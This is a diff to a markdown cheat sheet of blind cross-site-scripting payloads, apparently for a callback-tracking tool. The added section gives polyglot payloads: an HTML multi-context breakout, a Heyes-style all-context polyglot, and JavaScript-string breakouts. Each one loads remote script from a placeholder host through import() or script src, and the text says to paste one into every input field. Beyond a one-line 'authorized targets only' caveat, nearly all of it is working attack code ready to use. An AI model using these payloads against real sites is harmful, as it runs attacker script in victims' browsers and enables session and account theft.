@@ -4,6 +4,27 @@ Point every payload at `https://<HOST>/c/<TOKEN>`. Use a **distinct TOKEN per
 injection point** so callbacks self-identify. `<HOST>` = your worker custom domain.
 Cheapest → most evasive. Authorized targets only.
 
+## 0. Polyglot — one payload for ANY input (spray-and-pray)
+When you don't know the sink's context (HTML text, attribute, `<textarea>`/`<title>`,
+`<style>`/`<script>`, or a JS string), paste **one** of these into every field. Each combines
+several break-outs + fix-ups so at least one path fires. Best first probe when seeding many
+fields fast; still prefer a context-specific payload from §1–§2 once you know the sink.
+
+```html
+<!-- (a) multi-context HTML breakout — escapes attribute, RCDATA, raw-text, and HTML-text at once -->
+">'></textarea></title></style></script><svg onload=import('//HOST/c/TOKEN')><img src onerror=import('//HOST/c/TOKEN')><script src=//HOST/c/TOKEN></script>
+
+<!-- (b) classic all-context polyglot (Heyes-style) — HTML + attribute + JS-string + comment + RCDATA -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=import('//HOST/c/TOKEN') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=import('//HOST/c/TOKEN')//>\x3e
+```
+```js
+// (c) pure JS-string context — when injected inside <script>var x='INJECT'</script> or an inline handler
+';import('//HOST/c/TOKEN');//
+'-import('//HOST/c/TOKEN')-'
+```
+All of these are one-click in the dashboard's **Payload Generator** (top "Polyglot" group),
+host + token already substituted.
+
 ## 1. Baseline — external script (needs `script-src` to allow HOST or be absent)
 ```html
 "><script src=//HOST/c/TOKEN></script>
